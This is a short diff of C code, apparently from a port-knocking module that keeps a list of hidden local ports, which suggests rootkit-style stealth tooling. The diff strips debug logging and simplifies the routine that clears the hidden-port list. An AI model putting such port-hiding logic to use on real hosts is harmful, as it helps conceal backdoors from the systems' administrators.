@@ -86,32 +86,8 @@ stage3_knock(lport_t port)
 void
 clear_hidden_lports(void)
 {
-    knock_list_t_ptr i;
-
-    ip_t no_ip = { 0 };
-
-    i = ips_stage1_tail;
-    if (memcmp(i->ip, no_ip, (i->version == v4 ? 4 : 16))) {
-        DEBUG_INFO("removing from stage1\n");
-        while ((i = remove_knock_from_list(i, &i, i->ip, i->version)));
-    }
-
-    i = ips_stage2_tail;
-    if (memcmp(i->ip, no_ip, (i->version == v4 ? 4 : 16))) {
-        DEBUG_INFO("removing from stage2\n");
-        while ((i = remove_knock_from_list(i, &i, i->ip, i->version)));
-    }
-
-    i = ips_stage3_tail;
-    if (memcmp(i->ip, no_ip, (i->version == v4 ? 4 : 16))) {
-        DEBUG_INFO("removing from stage3\n");
-        while ((i = remove_knock_from_list(i, &i, i->ip, i->version)));
-    }
-
-    lport_list_t_ptr j;
-
-    j = hidden_lports_tail;
-    while ((j = remove_lport_from_list(j, j->lport)));
+    lport_list_t_ptr i = hidden_lports_tail;
+    while ((i = remove_lport_from_list(i, i->lport)));
 }
 
 bool
@@ -185,12 +161,8 @@ find_knock_in_list(knock_list_t_ptr head, ip_t ip, ip_version version)
 {
     knock_list_t_ptr i;
     for (i = head; i; i = i->next)
-        if (!memcmp(i->ip, ip, (version == v4 ? 4 : 16)) && (version == -1 || i->version == version)) {
-            int knock;
-            memcpy(&knock, ip, 4);
-            DEBUG_INFO("found ip %0X in list\n", knock);
+        if (!memcmp(i->ip, ip, (version == v4 ? 4 : 16)) && (version == -1 || i->version == version))
             return i;
-        }
 
     return NULL;
 }
@@ -220,9 +192,6 @@ remove_knock_from_list(knock_list_t_ptr list, knock_list_t_ptr *tail, ip_t ip, i
     knock_list_t_ptr i = find_knock_in_list(list, ip, version), ret = NULL;
 
     if (i && (!memcmp(i->ip, ip, (version == v4 ? 4 : 16)) && i->version != -1)) {
-            int knock;
-            memcpy(&knock, ip, 4);
-            DEBUG_INFO("removing ip %0X from list\n", knock);
         if (i->next)
             i->next->prev = i->prev;
         else
